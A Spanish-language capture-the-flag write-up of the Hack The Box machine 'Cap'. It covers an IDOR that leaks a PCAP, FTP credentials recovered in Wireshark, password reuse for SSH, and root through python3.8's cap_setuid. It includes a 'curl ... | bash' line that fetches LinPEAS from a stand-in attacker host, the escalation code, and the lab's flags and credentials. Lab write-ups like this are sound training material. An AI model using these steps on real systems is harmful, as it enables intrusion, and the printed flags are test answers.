# Cap — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Cap](https://app.hackthebox.com/machines/Cap) |
| **Plataforma** | [Hack The Box](https://hackthebox.com/) |
| **Sistema Operativo** | Linux (Ubuntu 20.04) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

Se realiza un escaneo completo con Nmap para descubrir los servicios activos en la máquina:

```bash
nmap -p- -sCV -T5 10.129.32.218 -oN cap
```

![Nmap Scan](images/01Nmap.JPG)

Servicios encontrados:

| Puerto | Servicio | Versión |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Gunicorn (título: Security Dashboard) |

---

## Enumeración Web — IDOR

Al acceder al puerto 80 se muestra un **Security Dashboard** que permite capturar tráfico de red y descargar los resultados en formato PCAP. Navegando por la aplicación, se accede a `/data/2`, que muestra estadísticas de una captura con tan solo 6 paquetes:

![Web Dashboard](images/02web.JPG)

La URL sigue el patrón `/data/<id>`. Se prueba a modificar el parámetro manualmente a `/data/0`:

![IDOR /data/0](images/03descubriendo_el_numero.JPG)

Esta técnica se conoce como **IDOR** (Insecure Direct Object Reference): la aplicación no valida que el recurso solicitado pertenezca al usuario autenticado, lo que permite acceder a capturas de otros usuarios. El PCAP número `0` contiene **72 paquetes**, mucho más tráfico que la captura propia. Se descarga pulsando el botón *Download*.

---

## Análisis del PCAP con Wireshark

### Apertura del archivo

Se abre `0.pcap` con Wireshark para analizar el tráfico capturado:

![Wireshark PCAP](images/04wireshark.JPG)

Se observan protocolos HTTP y FTP mezclados en la captura.

### Jerarquía de protocolos

Para identificar qué protocolo contiene más información relevante, se consulta la estadística de jerarquía de protocolos (*Estadísticas → Jerarquía de protocolos*):

![Protocol Hierarchy](images/05_jearquia_wireshark.JPG)

El protocolo **FTP** representa el 34.7% del tráfico total (25 paquetes). Esto es especialmente relevante porque **FTP transmite las credenciales en texto plano**, sin ningún tipo de cifrado.

### Extracción de credenciales FTP

Se aplica el siguiente filtro en Wireshark para aislar únicamente el tráfico FTP:

```
_ws.col.protocol == "FTP"
```

![FTP Credentials](images/06_encontrarcredenciales.JPG)

Las credenciales quedan expuestas en claro en los paquetes de autenticación:

| Campo | Valor |
|---|---|
| **Usuario** | `nathan` |
| **Contraseña** | `Buck3tH4TF0RM3!` |

---

## Acceso Inicial

### Conexión FTP

Con las credenciales obtenidas del PCAP, se accede al servicio FTP:

```bash
ftp nathan@10.129.32.218
```

![FTP Login](images/07.JPG)

### Flag de usuario

Dentro del servidor FTP se encuentra directamente el archivo `user.txt`:

```ftp
ls
get user.txt
```

![FTP Download](images/08flaguser.JPG)

```bash
cat user.txt
```

![User Flag](images/09.JPG)

Flag: **`4f762be5f7626a17b04f7e84853f1506`**

### Conexión SSH

La misma contraseña funciona para el servicio SSH (reutilización de credenciales):

```bash
ssh nathan@10.129.32.218
```

![SSH Login](images/10conexionssh.JPG)

Se confirma acceso a **Ubuntu 20.04 LTS** como el usuario `nathan`.

---

## Escalada de Privilegios

### Enumeración con LinPEAS

Se transfiere y ejecuta **LinPEAS** desde la máquina atacante para automatizar la búsqueda de vectores de escalada:

```bash
# En la máquina atacante:
python3 -m http.server 82

# En la máquina víctima:
curl http://<ATACANTE>:82/linpeas.sh | bash
```

![LinPEAS Capabilities](images/11linpeasserroot.JPG)

LinPEAS identifica una **Linux Capability** crítica asignada al binario de Python:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### ¿Qué son las Linux Capabilities?

Las **Linux Capabilities** son un mecanismo del kernel que divide los privilegios del usuario `root` en unidades más pequeñas y granulares. En lugar de ejecutar un programa completo como root, se le pueden asignar capacidades específicas.

En este caso, `cap_setuid` permite al proceso **cambiar su UID** (User ID) de forma arbitraria, lo que equivale a poder convertirse en cualquier usuario del sistema, incluido `root` (UID 0). Como `python3.8` tiene esta capability asignada con el flag `+eip` (efectiva, heredable, permitida), cualquier usuario que ejecute ese binario puede escalar a root.

### Explotación

Se lanza el intérprete de Python directamente y se aprovecha `cap_setuid` para fijar el UID a `0` (root) y abrir una shell:

```bash
/usr/bin/python3.8
```

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

![Python Capability Exploit](images/12escalada.JPG)

### Verificación

```bash
whoami
```

![Whoami Root](images/13root.JPG)

Confirmado: **root**.

### Flag de root

```bash
cd /root
la
cat root.txt
```

![Root Flag](images/14finalflag.JPG)

Flag: **`54cf7e33807879e5f766e03255dcae19`**

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Enumeración web | IDOR en `/data/<id>` | Navegador |
| Análisis de tráfico | Inspección de PCAP | Wireshark |
| Obtención de credenciales | Credenciales FTP en claro | Wireshark (filtro FTP) |
| Acceso inicial | FTP + SSH (reutilización de contraseña) | `ftp`, `ssh` |
| Enumeración interna | Script automatizado | LinPEAS |
| Escalada de privilegios | Linux Capability `cap_setuid` en Python | `python3.8` |
